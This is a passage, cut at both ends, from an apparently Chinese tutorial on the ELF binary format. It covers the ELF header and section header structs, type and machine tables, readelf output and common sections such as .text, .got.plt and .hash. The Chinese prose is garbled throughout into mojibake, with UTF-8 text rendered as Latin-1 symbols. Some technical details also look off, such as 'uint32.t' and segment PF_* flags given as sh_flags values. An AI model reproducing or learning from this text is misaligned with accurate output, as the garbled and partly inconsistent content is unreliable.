‡æ–‡ä»¶ã€‚å…¶æ¬¡ï¼ŒåŠ¨æ€é“¾æ¥å™¨ï¼ˆDynamic Linkerï¼‰å¯èƒ½å°†å®ƒä¸æŸä¸ªå¯æ‰§è¡Œæ–‡ä»¶ä»¥åŠå…¶å®ƒå…±äº«ç›®æ ‡ä¸€èµ·ç»„åˆï¼Œåˆ›å»ºè¿›ç¨‹æ˜ åƒã€‚ ä¸€ä¸ªæ›´æ¸…æ™°æ˜“æ‡‚çš„ELFæ ¼å¼ï¼š æ–‡ä»¶å¼€å§‹å¤„æ˜¯ä¸€ä¸ªELF å¤´éƒ¨ï¼ˆELF Headerï¼‰ï¼Œç”¨æ¥æè¿°æ•´ä¸ªæ–‡ä»¶çš„ç»„ç»‡ã€‚èŠ‚åŒºéƒ¨åˆ†åŒ…å«é“¾æ¥è§†å›¾çš„å¤§é‡ä¿¡æ¯ï¼šæŒ‡ä»¤ã€æ•°æ®ã€ç¬¦å·è¡¨ã€é‡å®šä½ä¿¡æ¯ç­‰ç­‰ã€‚ ç¨‹åºå¤´éƒ¨è¡¨ï¼ˆProgram Header Tableï¼‰ï¼Œå¦‚æœå­˜åœ¨çš„è¯ï¼Œå‘Šè¯‰ç³»ç»Ÿå¦‚ä½•åˆ›å»ºè¿›ç¨‹æ˜ åƒã€‚ç”¨æ¥æ„é€ è¿›ç¨‹æ˜ åƒçš„ç›®æ ‡æ–‡ä»¶å¿…é¡»å…·æœ‰ç¨‹åºå¤´éƒ¨è¡¨ï¼Œå¯é‡å®šä½æ–‡ä»¶ä¸éœ€è¦è¿™ä¸ªè¡¨ã€‚ èŠ‚åŒºå¤´éƒ¨è¡¨ï¼ˆSection Heade Tableï¼‰åŒ…å«äº†æè¿°æ–‡ä»¶èŠ‚åŒºçš„ä¿¡æ¯ï¼Œæ¯ä¸ªèŠ‚åŒºåœ¨è¡¨ä¸­éƒ½æœ‰ä¸€é¡¹ï¼Œæ¯ä¸€é¡¹ç»™å‡ºè¯¸å¦‚èŠ‚åŒºåç§°ã€èŠ‚åŒºå¤§å°è¿™ç±»ä¿¡æ¯ã€‚ç”¨äºé“¾æ¥çš„ç›®æ ‡æ–‡ä»¶å¿…é¡»åŒ…å«èŠ‚åŒºå¤´éƒ¨è¡¨ï¼Œå…¶ä»–ç›®æ ‡æ–‡ä»¶å¯ä»¥æœ‰ï¼Œä¹Ÿå¯ä»¥æ²¡æœ‰è¿™ä¸ªè¡¨ã€‚ ELF Header12345678910111213141516171819#define EI_NIDENT (16)typedef struct&#123; unsigned char e_ident[EI_NIDENT]; /* Magic number and other info */ Elf32_Half e_type; /* Object file type */ Elf32_Half e_machine; /* Architecture */ Elf32_Word e_version; /* Object file version */ Elf32_Addr e_entry; /* Entry point virtual address */ Elf32_Off e_phoff; /* Program header table file offset */ Elf32_Off e_shoff; /* Section header table file offset */ Elf32_Word e_flags; /* Processor-specific flags */ Elf32_Half e_ehsize; /* ELF header size in bytes */ Elf32_Half e_phentsize; /* Program header table entry size */ Elf32_Half e_phnum; /* Program header table entry count */ Elf32_Half e_shentsize; /* Section header table entry size */ Elf32_Half e_shnum; /* Section header table entry count */ Elf32_Half e_shstrndx; /* Section header string table index */&#125; Elf32_Ehdr; ä¸Šè¿°çš„Elf32_Halfå®šä¹‰ 12/* Type for a 16-bit quantity. */typedef uint16_t Elf32_Half; å…¶ä¸­Elf32_Wordçš„å®šä¹‰ 12/* Types for signed and unsigned 32-bit quantities. */typedef uint32_t Elf32_Word; ç„¶åElf32_Addrä¸Elf32_Offå®šä¹‰ 12345/* Type of addresses. */typedef uint32_t Elf32_Addr;/* Type of file offsets. */typedef uint32_t Elf32_Off; e_ident[EI_NIDENT] æ–‡ä»¶çš„æ ‡è¯†ä»¥åŠæ ‡è¯†æè¿°äº†elfå¦‚ä½•ç¼–ç ç­‰ä¿¡æ¯ã€‚ 1Magicï¼š 7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 å…³äºè¯¥ç»“æ„ä½“çš„ç´¢å¼•å¯ä»¥çœ‹ä¸‹é¢çš„è¡¨æ ¼ï¼š åç§° å–å€¼ ç›®çš„ EI_MAG0 0 æ–‡ä»¶æ ‡è¯†(0x7f) EI_MAG1 1 æ–‡ä»¶æ ‡è¯†(E) EI_MAG2 2 æ–‡ä»¶æ ‡è¯†(L) EI_MAG3 3 æ–‡ä»¶æ ‡è¯†(F) EI_CLASS 4 æ–‡ä»¶ç±» EI_DATA 5 æ•°æ®ç¼–ç  EI_VERSION 6 æ–‡ä»¶ç‰ˆæœ¬ EI_PAD 7 è¡¥é½å­—èŠ‚å¼€å§‹å¤„ EI_NIDENT 16 e_ident[]å¤§å° e_type è¯¥æ•°æ®ç±»å‹æ˜¯uint16_tæ•°æ®ç±»å‹çš„ï¼Œå ä¸¤ä¸ªå­—èŠ‚ã€‚é€šè¿‡å­—æ®µæŸ¥çœ‹ï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸ªå€¼ä¸º00 02ã€‚è¡¨æ ¼å®šä¹‰å¦‚ä¸‹ï¼š åç§° å–å€¼ å«ä¹‰ ET_NONE 0x0000 æœªçŸ¥ç›®æ ‡æ–‡ä»¶æ ¼å¼ ET_ERL 0x0001 å¯é‡å®šä½æ–‡ä»¶ ET_EXEC 0x0002 å¯æ‰§è¡Œæ–‡ä»¶ ET_DYN 0x0003 å…±äº«ç›®æ ‡æ–‡ä»¶ ET_CORE 0x0004 Coreæ–‡ä»¶(è½¬å‚¨æ ¼å¼) ET_LOPROC 0xff00 ç‰¹å®šå¤„ç†å™¨æ–‡ä»¶ ET_HIPROC 0xffff ç‰¹å®šå¤„ç†å™¨æ–‡ä»¶ e_machine ç”±å­—æ®µå¯ä»¥çœ‹åˆ°ä¸º00 28ï¼Œå…³äºè¿™ä¸ªå­—æ®µçš„è§£æï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯è¡¨ç¤ºè¯¥elfæ–‡ä»¶æ˜¯é’ˆå¯¹å“ªä¸ªå¤„ç†å™¨æ¶æ„çš„ã€‚ ä¸‹é¢åªåˆ—å‡ºå‡ ä¸ªå¸¸è§çš„æ¶æ„çš„åºå· åç§° å–å€¼ å«ä¹‰ EM_NONE 0 No machine EM_SPARC 2 SPARC EM_386 3 Intel 80386 EM_MIPS 8 MIPS I Architecture EM_PPC 0x14 PowerPC EM_ARM 0x28 Advanced RISC Machines ARM e_version è¯¥å­—æ®µå å››ä¸ªå­—èŠ‚ï¼Œè¡¨ç¤ºå½“å‰æ–‡ä»¶ç‰ˆæœ¬çš„ä¿¡æ¯ã€‚ç°åœ¨å–å€¼ä¸º00 00 00 01ã€‚ä»å–å€¼ä¸Šæ¥çœ‹ åç§° å–å€¼ å«ä¹‰ EV_NONE 0 éæ³•ç‰ˆæœ¬ EV_CURRENT 1 å½“å‰ç‰ˆæœ¬ e_entry è¿™é‡Œè¡¨ç¤ºç¨‹åºçš„å…¥å£åœ°å€ï¼Œç›®å‰ä¸ºå››å­—èŠ‚ï¼Œæ‰€ä»¥é€šè¿‡å­—æ®µè§£æåˆ°çš„å†…å®¹ä¸º00 00 80 00ã€‚å¾—åˆ°å¯æ‰§è¡Œç¨‹åºçš„å…¥å£åœ°å€ä¸º0x8000ã€‚ e_phoff è¯¥å­—æ®µè¡¨ç¤ºç¨‹åºè¡¨å¤´åç§»ã€‚å å››ä¸ªå­—èŠ‚ï¼Œæ ¹æ®å­—æ®µè§£æï¼Œå¯ä»¥æŸ¥çœ‹å½“å‰çš„åç§»é‡ä¸º00 00 00 34ã€‚ä¹Ÿå°±æ˜¯å®é™…çš„åç§»é‡ä¸º52ä¸ªå­—èŠ‚ã€‚è¿™52ä¸ªå­—èŠ‚å…¶å®å°±æ˜¯å¤´éƒ¨çš„ä¿¡æ¯æ•°æ®ç»“æ„ä½“çš„å¤§å°ã€‚ e_shoff è¯¥åŒºåŸŸæ¯”è¾ƒé‡è¦ï¼Œè®°å½•äº†sectionçš„åç§»åœ°å€ã€‚ä¸ºå››å­—èŠ‚ï¼Œè§£æå‡ºæ¥çš„å­—æ®µä¸º0x00 04 24 5cã€‚æ‰€ä»¥å¾—åˆ°åœ°å€ä¸º0x4245cã€‚ e_ehsize elfæ–‡ä»¶çš„å¤´éƒ¨å¤§å°ã€‚è¯¥å–å€¼ä¸å¤´æ–‡ä»¶ç»“æ„ä½“çš„å¤§å°ç›¸å…³ e_phnum ç›®å‰å–å€¼ä¸º00 01ï¼Œè¿™é‡Œè¡¨ç¤ºç¨‹åºå¤´çš„ä¸ªæ•°å½“å‰åªæœ‰ä¸€ä¸ªç¨‹åºå¤´ï¼Œå¦‚æœæœ‰å¤šä¸ªç¨‹åºå¤´è¡¨ï¼Œé‚£ä¹ˆä¼šåœ¨elfå¤´æ–‡ä»¶ä¹‹åï¼Œä¹Ÿå°±æ˜¯52ä¸ªå­—èŠ‚ä¹‹åï¼Œä¾æ¬¡å‘ä¸‹æ’åˆ—ã€‚å› ä¸ºè¿™é‡Œæ˜¯1ï¼Œæ‰€ä»¥åªæœ‰1ä¸ªç¨‹åºå¤´ã€‚ ä»¥ä¸‹ä½64ä½ELFæ–‡ä»¶å¤´å†…å®¹ 12345678910111213141516171819202122ubuntu@ubuntu:~/code/c_code$ gcc -g test.c -o testubuntu@ubuntu:~/code/c_code$ readelf -h testELF Header: Magic: 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 Class: ELF64 Data: 2&#x27;s complement, little endian Version: 1 (current) OS/ABI: UNIX - System V ABI Version: 0 Type: DYN (Shared object file) Machine: Advanced Micro Devices X86-64 Version: 0x1 Entry point address: 0x530 Start of program headers: 64 (bytes into file) Start of section headers: 8648 (bytes into file) Flags: 0x0 Size of this header: 64 (bytes) Size of program headers: 56 (bytes) Number of program headers: 9 Size of section headers: 64 (bytes) Number of section headers: 34 Section header string table index: 33 ä»¥ä¸Šæ˜¯ELF_Headeréƒ¨åˆ† å…³äºç¨‹åºå¤´éƒ¨(Program Header)å°†åœ¨ç¨‹åºåŠ è½½å’ŒåŠ¨æ€é“¾æ¥éƒ¨åˆ†ä»‹ç» ELFèŠ‚åŒºï¼ˆSectionsï¼‰èŠ‚åŒºä¸­åŒ…å«ç›®æ ‡æ–‡ä»¶ä¸­çš„æ‰€æœ‰ä¿¡æ¯ï¼Œé™¤äº†ï¼šELFå¤´éƒ¨ã€ç¨‹åºå¤´éƒ¨è¡¨æ ¼ã€èŠ‚åŒºå¤´éƒ¨è¡¨æ ¼ã€‚èŠ‚åŒºæ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š (1).ç›®æ ‡æ–‡ä»¶ä¸­çš„æ¯ä¸ªèŠ‚åŒºéƒ½æœ‰å¯¹åº”çš„èŠ‚åŒºå¤´éƒ¨æè¿°å®ƒï¼Œåè¿‡æ¥ï¼Œæœ‰èŠ‚åŒºå¤´éƒ¨ä¸æ„å‘³ç€æœ‰èŠ‚åŒºã€‚ (2).æ¯ä¸ªèŠ‚åŒºå ç”¨æ–‡ä»¶ä¸­ä¸€ä¸ªè¿ç»­å­—èŠ‚åŒºåŸŸï¼ˆè¿™ä¸ªåŒºåŸŸå¯èƒ½é•¿åº¦ä¸º 0ï¼‰ã€‚ (3).æ–‡ä»¶ä¸­çš„èŠ‚åŒºä¸èƒ½é‡å ï¼Œä¸å…è®¸ä¸€ä¸ªå­—èŠ‚å­˜åœ¨äºä¸¤ä¸ªèŠ‚åŒºä¸­çš„æƒ…å†µå‘ç”Ÿã€‚ (4).ç›®æ ‡æ–‡ä»¶ä¸­å¯èƒ½åŒ…å«éæ´»åŠ¨ç©ºé—´ï¼ˆINACTIVE SPACEï¼‰ã€‚è¿™äº›åŒºåŸŸä¸å±äºä»»ä½•å¤´éƒ¨å’ŒèŠ‚åŒºï¼Œå…¶å†…å®¹æœªæŒ‡å®šã€‚ è¿™é‡Œå¼•å…¥èŠ‚(section)å’Œæ®µ(segment)çš„åŒºåˆ«: æ®µæ˜¯ç¨‹åºæ‰§è¡Œçš„å¿…è¦ç»„æˆæˆåˆ†ã€‚ æ¯ä¸ªæ®µä¸­ï¼Œä¼šæœ‰ä»£ç æˆ–æ•°æ®è¢«åˆ’åˆ†ä¸ºä¸åŒçš„èŠ‚ã€‚ èŠ‚å¤´è¡¨æ˜¯å¯¹è¿™äº›èŠ‚ä½ç½®å’Œå¤§å°çš„æè¿°ï¼Œä¸»è¦ç”¨äºé“¾æ¥å’Œè°ƒè¯•ã€‚å¯¹äºç¨‹åºæ‰§è¡Œæ¥è¯´æ˜¯éå¿…é¡»çš„ï¼Œæ²¡æœ‰èŠ‚å¤´è¡¨ç¨‹åºä¸€ä¹å¯ä»¥æ­£å¸¸æ‰§è¡Œï¼Œå› ä¸ºèŠ‚å¤´è¡¨æ²¡æœ‰å¯¹ç¨‹åºå†…å­˜å¸ƒå±€è¿›è¡Œå¸ƒå±€ï¼Œå¯¹ç¨‹åºå¸ƒå±€çš„æè¿°æ˜¯ç¨‹åºå¤´è¡¨çš„ä»»åŠ¡ã€‚ å¦‚æœäºŒè¿›åˆ¶æ–‡ä»¶ä¸­ç¼ºå°‘èŠ‚å¤´ï¼Œå¹¶ä¸æ„å‘³ç€èŠ‚å°±ä¸å­˜åœ¨ã€‚åªæ˜¯æ²¡æœ‰åŠæ³•é€šè¿‡èŠ‚å¤´æ¥å¼•ç”¨èŠ‚ï¼Œå¯¹äºè°ƒè¯•å™¨æˆ–è€…åç¼–è¯‘ç¨‹åºæ¥è¯´ï¼Œåªæ˜¯å¯ä»¥å‚è€ƒçš„ä¿¡æ¯å˜å°‘äº†è€Œå·²ã€‚ æ¯ä¸€ä¸ªèŠ‚éƒ½ä¿å­˜äº†æŸç§ç±»å‹çš„ä»£ç æˆ–è€…æ•°æ®ã€‚æ•°æ®å¯ä»¥æ˜¯ç¨‹åºä¸­çš„å…¨å±€å˜é‡ï¼Œä¹Ÿå¯ä»¥æ˜¯é“¾æ¥å™¨æ‰€éœ€è¦çš„åŠ¨æ€é“¾æ¥ä¿¡æ¯ã€‚æ­£å¦‚å‰é¢æåˆ°çš„ï¼Œæ¯ä¸ªELFç›®æ ‡æ–‡ä»¶éƒ½æœ‰èŠ‚ï¼Œä½†æ˜¯ä¸ä¸€å®šæœ‰èŠ‚å¤´ï¼Œå°¤å…¶æ˜¯æœ‰äººæ•…æ„å°†èŠ‚å¤´ä»èŠ‚å¤´è¡¨ä¸­åˆ é™¤äº†ä¹‹åã€‚å½“ç„¶ï¼Œé»˜è®¤æ˜¯æœ‰èŠ‚å¤´çš„ã€‚ èŠ‚åŒºå¤´éƒ¨æ•°æ®ç»“æ„å¦‚ä¸‹ï¼š 12345678910111213typedef struct&#123; Elf32_Word sh_name; /* Section name (string tbl index) */ Elf32_Word sh_type; /* Section type */ Elf32_Word sh_flags; /* Section flags */ Elf32_Addr sh_addr; /* Section virtual addr at execution */ Elf32_Off sh_offset; /* Section file offset */ Elf32_Word sh_size; /* Section size in bytes */ Elf32_Word sh_link; /* Link to another section */ Elf32_Word sh_info; /* Additional section information */ Elf32_Word sh_addralign; /* Section alignment */ Elf32_Word sh_entsize; /* Entry size if section holds table */&#125; Elf32_Shdr; é‡è¦å­—æ®µï¼š sh_flags å­—æ®µ sh_flagså­—æ®µå®šä¹‰äº†ä¸€ä¸ªèŠ‚åŒºä¸­åŒ…å«çš„å†…å®¹æ˜¯å¦å¯ä»¥ä¿®æ”¹ã€æ˜¯å¦å¯ä»¥æ‰§è¡Œç­‰ä¿¡æ¯ã€‚å¦‚æœä¸€ä¸ªæ ‡å¿—ä½è¢«è®¾ç½®ï¼Œåˆ™è¯¥ä½å–å€¼ä¸º1ã€‚æœªå®šä¹‰çš„å„ä½éƒ½è®¾ç½®ä¸º0ã€‚ å–å€¼å¦‚ä¸‹ 12345#define PF_X (1 &lt;&lt; 0) /* Segment is executable */#define PF_W (1 &lt;&lt; 1) /* Segment is writable */#define PF_R (1 &lt;&lt; 2) /* Segment is readable */#define PF_MASKOS 0x0ff00000 /* OS-specific */#define PF_MASKPROC 0xf0000000 /* Processor-specific */ ä¸‹é¢ä»‹ç»å‡ ä¸ªé‡è¦çš„èŠ‚ .text èŠ‚ .textèŠ‚æ˜¯ä¿å­˜äº†ç¨‹åºä»£ç æŒ‡ä»¤çš„ä»£ç èŠ‚ã€‚ä¸€æ®µå¯æ‰§è¡Œç¨‹åºï¼Œå¦‚æœå­˜åœ¨Phdrï¼Œ.textèŠ‚å°±ä¼šå­˜åœ¨äºtextæ®µä¸­ã€‚ç”±äº.textèŠ‚ä¿å­˜äº†ç¨‹åºä»£ç ï¼Œå› æ­¤èŠ‚çš„ç±»å‹ä¸ºSHT_PROGBITSã€‚ .rodata èŠ‚ .rodataèŠ‚ä¿å­˜äº†åªè¯»çš„æ•°æ®ï¼Œå¦‚ä¸€è¡ŒCè¯­è¨€ä»£ç ä¸­çš„å­—ç¬¦ä¸²ã€‚ä¸‹é¢è¿™æ¡å‘½ä»¤å°±æ˜¯å­˜æ”¾åœ¨.rodataèŠ‚ä¸­çš„ï¼šprintf(â€œHello World!\\nâ€); å› ä¸º.rodataèŠ‚æ˜¯åªè¯»çš„ï¼Œæ‰€ä»¥åªèƒ½å­˜åœ¨äºä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶çš„åªè¯»æ®µä¸­ã€‚å› æ­¤ï¼Œåªèƒ½åœ¨textæ®µï¼ˆä¸æ˜¯dataæ®µï¼‰ä¸­æ‰¾åˆ°.rodataèŠ‚ã€‚ç”±äº.rodataèŠ‚æ˜¯åªè¯»çš„ï¼Œå› æ­¤èŠ‚ç±»å‹ä¸ºSHT_PROGBITSã€‚ .plt èŠ‚ æœ¬æ–‡åœ¨åŠ¨æ€é“¾æ¥çš„è¿‡ç¨‹é“¾æ¥è¡¨ï¼ˆProcedure Linkage Tableï¼ŒPLTï¼‰è¿›è¡Œè¯¦ç»†ä»‹ç»ã€‚.pltèŠ‚ä¸­åŒ…å«äº†åŠ¨æ€é“¾æ¥å™¨è°ƒç”¨ä»å…±äº«åº“å¯¼å…¥çš„å‡½æ•°æ‰€å¿…éœ€çš„ç›¸å…³ä»£ç ã€‚ç”±äºå…¶å­˜åœ¨äºtextæ®µä¸­ï¼ŒåŒæ ·ä¿å­˜äº†ä»£ç ï¼Œå› æ­¤èŠ‚ç±»å‹ä¸ºSHT_PROGBITSã€‚ .data èŠ‚ ä¸è¦å°†.dataèŠ‚å’Œdataæ®µæ··æ·†äº†ï¼Œ.dataèŠ‚å­˜åœ¨äºdataæ®µä¸­ï¼Œä¿å­˜äº†åˆå§‹åŒ–çš„å…¨å±€å˜é‡ç­‰æ•°æ®ã€‚ç”±äºå…¶ä¿å­˜äº†ç¨‹åºçš„å˜é‡æ•°æ®ï¼Œå› æ­¤ç±»å‹è¢«æ ‡è®°ä¸ºSHT_PROGBITSã€‚ .bss èŠ‚ .bssèŠ‚ä¿å­˜äº†æœªè¿›è¡Œåˆå§‹åŒ–çš„å…¨å±€æ•°æ®ï¼Œæ˜¯dataæ®µçš„ä¸€éƒ¨åˆ†ï¼Œå ç”¨ç©ºé—´ä¸è¶…è¿‡4å­—èŠ‚ï¼Œä»…è¡¨ç¤ºè¿™ä¸ªèŠ‚æœ¬èº«çš„ç©ºé—´ã€‚ç¨‹åºåŠ è½½æ—¶æ•°æ®è¢«åˆå§‹åŒ–ä¸º0ï¼Œåœ¨ç¨‹åºæ‰§è¡ŒæœŸé—´å¯ä»¥è¿›è¡Œèµ‹å€¼ã€‚ç”±äº.bssèŠ‚æœªä¿å­˜å®é™…çš„æ•°æ®ï¼Œå› æ­¤èŠ‚ç±»å‹ä¸ºSHT_NOBITSã€‚ .got.plt èŠ‚ .gotèŠ‚ä¿å­˜äº†å…¨å±€åç§»è¡¨ã€‚.gotèŠ‚å’Œ.pltèŠ‚ä¸€èµ·æä¾›äº†å¯¹å¯¼å…¥çš„å…±äº«åº“å‡½æ•°çš„è®¿é—®å…¥å£ï¼Œç”±åŠ¨æ€é“¾æ¥å™¨åœ¨è¿è¡Œæ—¶è¿›è¡Œä¿®æ”¹ã€‚å¦‚æœæ”»å‡»è€…è·å¾—äº†å †æˆ–è€….bssæ¼æ´çš„ä¸€ä¸ªæŒ‡é’ˆå¤§å°çš„å†™åŸè¯­ï¼Œå°±å¯ä»¥å¯¹è¯¥èŠ‚ä»»æ„è¿›è¡Œä¿®æ”¹ã€‚æˆ‘ä»¬å°†åœ¨æœ¬é—®çš„ELFåŠ¨æ€é“¾æ¥éƒ¨åˆ†å¯¹æ­¤è¿›è¡Œè®¨è®ºã€‚.got.pltèŠ‚è·Ÿç¨‹åºæ‰§è¡Œæœ‰å…³ï¼Œå› æ­¤èŠ‚ç±»å‹è¢«æ ‡è®°ä¸ºSHT_PROGBITSã€‚ .dynsym èŠ‚ .dynsymèŠ‚ä¿å­˜äº†ä»å…±äº«åº“å¯¼å…¥çš„åŠ¨æ€ç¬¦å·ä¿¡æ¯ï¼Œè¯¥èŠ‚ä¿å­˜åœ¨textæ®µä¸­ï¼ŒèŠ‚ç±»å‹è¢«æ ‡è®°ä¸ºSHT_DYNSYMã€‚ .dynstr èŠ‚ .dynstrèŠ‚ä¿å­˜äº†åŠ¨æ€ç¬¦å·å­—ç¬¦ä¸²è¡¨ï¼Œè¡¨ä¸­å­˜æ”¾äº†ä¸€ç³»åˆ—å­—ç¬¦ä¸²ï¼Œè¿™äº›å­—ç¬¦ä¸²ä»£è¡¨äº†ç¬¦å·çš„åç§°ï¼Œä»¥ç©ºå­—ç¬¦ä½œä¸ºç»ˆæ­¢ç¬¦ã€‚ .rel.*èŠ‚ é‡å®šä½èŠ‚ä¿å­˜äº†é‡å®šä½ç›¸å…³çš„ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯æè¿°äº†å¦‚ä½•åœ¨é“¾æ¥æˆ–è€…è¿è¡Œæ—¶ï¼Œå¯¹ELFç›®æ ‡æ–‡ä»¶çš„æŸéƒ¨åˆ†å†…å®¹æˆ–è€…è¿›ç¨‹é•œåƒè¿›è¡Œè¡¥å……æˆ–ä¿®æ”¹ã€‚åœ¨æœ¬æ–‡é‡å®šä½éƒ¨åˆ†ä¼šæ·±å…¥è®¨è®ºã€‚é‡å®šä½èŠ‚ä¿å­˜äº†é‡å®šä½ç›¸å…³çš„æ•°æ®ï¼Œå› æ­¤èŠ‚ç±»å‹è¢«æ ‡è®°ä¸ºSHT_RELã€‚ .hashèŠ‚ .hashèŠ‚æœ‰æ—¶ä¹Ÿç§°ä¸º.gnu.hashï¼Œä¿å­˜äº†ä¸€ä¸ªç”¨äºæŸ¥æ‰¾ç¬¦å·çš„æ•£åˆ—è¡¨ã€‚ ä¸‹é¢çš„æ•£åˆ—ç®—æ³•æ˜¯ç”¨æ¥åœ¨Linux ELFæ–‡ä»¶ä¸­æŸ¥æ‰¾ç¬¦å·åçš„ï¼š 123456789uint32.t dl_new_hash(const char *s) &#123; uint32_t h = 5381; for(unsigned char c = *s;c != &#x27;\\0&#x27;; c = *++s) h = h * 33 + c;//Or h = ((h &lt;&lt; 5) + h) + c return h; &#125; .symtabèŠ‚ .symtabèŠ‚ä¿å­˜äº†ElfN_Symç±»å‹çš„ç¬¦å·ä¿¡æ¯ï¼Œæœ¬æ–‡å°†åœ¨ELFç¬¦å·å’Œé‡å®šä½éƒ¨åˆ†è¯¦ç»†ä»‹ç»ã€‚.symtabèŠ‚ä¿å­˜äº†ç¬¦å·ä¿¡æ¯ï¼Œå› æ­¤èŠ‚ç±»å‹è¢«æ ‡è®°ä¸ºSHT_SYMTABã€‚ .strtabèŠ‚ .strtabèŠ‚ä¿å­˜çš„æ˜¯ç¬¦å·å­—ç¬¦ä¸²è¡¨ï¼Œè¡¨ä¸­çš„å†…å®¹ä¼šè¢«.symtabçš„ElfN_Symç»“æ„ä¸­çš„st_nameæ¡ç›®å¼•ç”¨ã€‚ç”±äºå…¶ä¿å­˜äº†å­—ç¬¦ä¸²è¡¨ï¼Œå› æ­¤èŠ‚ç±»å‹è¢«æ ‡è®°ä¸ºSHT_STRTABã€‚ è¿™éƒ¨åˆ†å†…å®¹åœ¨ELFç¬¦å·å…·ä½“å±•å¼€ä»‹ç» .shstrtabèŠ‚ .shstrtabèŠ‚ä¿å­˜èŠ‚å¤´å­—ç¬¦ä¸²è¡¨ï¼Œè¯¥è¡¨æ˜¯ä¸€ä¸ªä»¥ç©ºå­—ç¬¦ç»ˆæ­¢çš„å­—ç¬¦ä¸²çš„é›†åˆï¼Œå­—ç¬¦ä¸²ä¿å­˜äº†æ¯ä¸ªèŠ‚çš„èŠ‚åï¼Œå¦‚.textã€.dataç­‰ã€‚æœ‰ä¸€ä¸ªåä¸ºe_shsrndxçš„ELFæ–‡ä»¶å¤´æ¡ç›®ä¼šæŒ‡å‘.shstrtabèŠ‚ï¼Œe_shstrndxä¸­ä¿å­˜äº†.shstrtabçš„åç§»é‡ã€‚ç”±äºå…¶ä¿å­˜äº†å­—ç¬¦ä¸²è¡¨ï¼Œå› æ­¤èŠ‚ç±»å‹è¢«æ ‡è®°ä¸ºSHT_STRTABã€‚ å­—ç¬¦ä¸²è¡¨èŠ‚åŒºåŒ…å«ä»¥NULLï¼ˆASCIIç 0ï¼‰ç»“å°¾çš„å­—ç¬¦åºåˆ—ï¼Œé€šå¸¸ç§°ä¸ºå­—ç¬¦ä¸²ã€‚ELFç›®æ ‡æ–‡ä»¶é€šå¸¸ä½¿ç”¨å­—ç¬¦ä¸²æ¥è¡¨ç¤ºç¬¦å·å’ŒèŠ‚åŒºåç§°ã€‚å¯¹å­—ç¬¦ä¸²çš„å¼•ç”¨é€šå¸¸ä»¥å­—ç¬¦ä¸²åœ¨å­—ç¬¦ä¸²è¡¨ä¸­çš„ä¸‹æ ‡ç»™å‡ºã€‚ ä¸€èˆ¬ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚ï¼ˆç´¢å¼•ä¸º 0ï¼‰å®šä¹‰ä¸ºä¸€ä¸ªç©ºå­—ç¬¦ä¸²ã€‚ç±»ä¼¼çš„ï¼Œå­—ç¬¦ä¸²è¡¨çš„æœ€åä¸€ä¸ªå­—èŠ‚ä¹Ÿå®šä¹‰ä¸º NULLï¼Œä»¥ç¡®ä¿æ‰€æœ‰çš„å­—ç¬¦ä¸²éƒ½ä»¥NULLç»“å°¾ã€‚ç´¢å¼•ä¸º0çš„å­—ç¬¦ä¸²åœ¨ä¸åŒçš„ä¸Šä¸‹æ–‡ä¸­å¯ä»¥è¡¨ç¤ºæ— åæˆ–è€…åå­—ä¸º NULLçš„å­—ç¬¦ä¸²ã€‚ å…è®¸å­˜åœ¨ç©ºçš„å­—ç¬¦ä¸²è¡¨èŠ‚åŒºï¼Œå…¶èŠ‚åŒºå¤´éƒ¨çš„sh_sizeæˆå‘˜åº”è¯¥ä¸º0ã€‚å¯¹ç©ºçš„å­—ç¬¦ä¸²è¡¨è€Œè¨€ï¼Œé0çš„ç´¢å¼•å€¼æ˜¯éæ³•çš„ã€‚ ä¾‹å¦‚ï¼šå¯¹äºå„ä¸ªèŠ‚åŒºè€Œè¨€ï¼ŒèŠ‚åŒºå¤´éƒ¨çš„sh_nameæˆå‘˜åŒ…å«å…¶å¯¹åº”çš„èŠ‚åŒºå¤´éƒ¨å­—ç¬¦ä¸²è¡¨èŠ‚åŒºçš„ç´¢å¼•ï¼Œæ­¤èŠ‚åŒºç”±ELF å¤´çš„e_shstrndx æˆå‘˜ç»™å‡ºã€‚ä¸‹å›¾ç»™å‡ºäº†åŒ…å« 25 ä¸ªå­—èŠ‚çš„ä¸€ä¸ªå­—ç¬¦ä¸²è¡¨ï¼Œä»¥åŠä¸ä¸åŒç´¢å¼•ç›¸å…³çš„å­—ç¬¦ä¸²ã€‚ Demo: è¡¨ä¸­åŒ…å«çš„å­—ç¬¦ä¸²å¦‚ä¸‹ï¼š ç´¢å¼• å­—ç¬¦ä¸² 0 æ—  1 name. 7 Variable 11 able 16 able 24 ç©ºå­—ç¬¦ä¸² åœ¨ä½¿ç”¨ã€åˆ†æå­—ç¬¦ä¸²è¡¨æ—¶ï¼Œè¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š å­—ç¬¦ä¸²è¡¨ç´¢å¼•å¯ä»¥å¼•ç”¨èŠ‚åŒºä¸­ä»»æ„å­—èŠ‚ã€‚ å­—ç¬¦ä¸²å¯ä»¥å‡ºç°å¤šæ¬¡ å¯ä»¥å­˜åœ¨å¯¹å­å­—ç¬¦ä¸²çš„å¼•ç”¨ ä¸€ä¸ªå­—ç¬¦ä¸²å¯ä»¥è¢«å¼•ç”¨å¤šæ¬¡ã€‚ å­—ç¬¦ä¸²è¡¨ä¸­ä¹Ÿå¯ä»¥å­˜åœ¨æœªå¼•ç”¨çš„å­—ç¬¦ä¸²ã€‚ .ctorså’Œ.dtorsèŠ‚ .ctorsï¼ˆæ„é€ å™¨ï¼‰å’Œ.dtorsï¼ˆææ„å™¨ï¼‰è¿™ä¸¤ä¸ªèŠ‚ä¿å­˜äº†æŒ‡å‘æ„é€ å‡½æ•°å’Œææ„å‡½æ•°çš„å‡½æ•°æŒ‡é’ˆï¼Œæ„é€ å‡½æ•°æ˜¯åœ¨mainå‡½æ•°æ‰§è¡Œä¹‹å‰éœ€è¦æ‰§è¡Œçš„ä»£ç ï¼Œææ„å‡½æ•°æ˜¯åœ¨mainå‡½æ•°ä¹‹åéœ€è¦æ‰§è¡Œçš„ä»£ç ã€‚ ELFç¨‹åºå¤´(Program 